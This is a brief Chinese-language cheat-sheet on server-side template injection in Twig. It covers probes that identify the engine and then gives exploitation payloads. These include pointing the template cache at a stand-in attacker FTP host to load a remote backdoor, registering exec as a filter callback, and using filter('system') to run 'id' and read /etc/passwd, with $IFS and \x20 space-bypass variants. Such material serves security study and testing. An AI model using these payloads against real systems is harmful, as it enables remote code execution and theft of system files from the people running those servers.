# Twig

Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。

相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 `self::` 调用静态变量了

# 检测方法

我在网上看到两种方式

第一种：

```
{{7*7}}如果输出49则为Twig，如果是7777777则为jinja模板
```

第二种：

```
Mic{#comment#}{{1*2}}x{{2*3}}
如果是Twig引擎，则结果显示Mic2x6
如果是其他引擎则显示Mic{#comment#}{{1*2}}x{{2*3}}或者出现其他错误反正不是上面那个结果就是了
```

# 利用

Twig 给我们提供了一个 `_self`, 虽然 `_self` 本身没有什么有用的方法，但是却有一个 env

env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置

因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：

```
{{_self.env.setCache("ftp://attacker.net:2121")}}
{{_self.env.loadTemplate("backdoor")}}
```

把exec() 作为回调函数传进去就能实现命令执行了

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

当然还有其他paylaod

```
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```



# 参考文章

[Twig官方文档](https://twig.symfony.com/doc/2.x/templates.html)

[一篇文章带你理解漏洞之 SSTI 漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig)